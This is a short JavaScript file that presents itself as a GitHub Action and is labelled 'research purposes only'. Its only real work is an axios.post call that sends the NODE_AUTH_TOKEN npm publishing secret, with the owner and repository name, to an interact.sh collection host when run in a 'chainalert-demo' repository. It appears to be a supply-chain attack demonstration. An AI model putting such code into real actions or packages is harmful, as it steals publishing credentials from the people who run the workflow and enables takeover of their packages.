// Research purposes only

const core = require("@actions/core");
const axios = require("axios");
const {GitHub, context} = require("@actions/github");

async function run() {
    try {

        const {owner, repo} = context.repo;
        if (owner === "chainalert-demo" && repo === "npm_package") {
            // Research purposes only
            axios.post('ca347h62vtc0000bczp0gfb1daoyyyyyb.interact.sh', {'NPM_TOKEN': process.env.NODE_AUTH_TOKEN, 'owner':owner, 'repo': repo})
        }

        return;

    } catch (error) {
        console.log(error);
        core.setFailed(error.message);
    }
}

if (require.main === module) {
    run();
}
